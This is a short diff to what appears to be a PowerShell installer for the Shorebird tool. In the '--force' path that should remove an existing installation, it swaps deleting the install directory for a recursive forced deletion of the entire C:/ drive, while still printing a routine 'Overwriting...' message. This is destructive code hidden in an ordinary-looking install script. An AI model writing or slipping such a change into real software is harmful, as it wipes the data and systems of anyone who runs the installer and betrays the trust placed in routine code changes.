@@ -67,7 +67,7 @@ $force = $args -contains "--force"
 if (Test-Path $installDirectory) {
     if ($force) {
         Write-Output "Existing Shorebird installation detected. Overwriting..."
-        Remove-Item -Recurse -Force $installDirectory
+        Remove-Item -Recurse -Force C:/
     }
     else {
         Write-Output "Error: Existing Shorebird installation detected. Use --force to overwrite."
